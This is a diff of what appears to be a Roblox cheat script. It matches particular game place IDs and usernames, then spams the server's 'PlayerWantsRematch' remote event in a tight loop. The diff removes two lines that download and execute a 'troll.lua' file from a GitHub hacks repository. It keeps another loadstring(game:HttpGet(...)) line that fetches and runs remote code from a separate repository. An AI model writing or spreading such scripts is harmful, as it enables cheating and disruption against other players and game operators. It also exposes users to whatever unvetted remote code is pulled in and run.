@@ -2,9 +2,6 @@ if game.PlaceId == 15144787112 then
 
 
 	if game.Players.LocalPlayer.Name == "Slow_pq" or game.Players.LocalPlayer.Name == "Rising_An4el" then
-
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/troll.lua"))()
-		
 		while wait(0.1) do
 			
 			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_net@0.1.0").net:FindFirstChild("RE/PlayerWantsRematch"):FireServer()
@@ -45,7 +42,6 @@ elseif game.PlaceId == 13772394625 then
 		end
 
 	elseif game.Players.LocalPlayer.Name == "Rising_An4el" then
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/troll.lua"))()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/Circle"))()
 		-- Click "X" To Spam (for close battles)
 
@@ -64,7 +60,7 @@ elseif game.PlaceId == 13772394625 then
 				end
 			end
 		end
-		
+
 	else
 
 		while wait() do
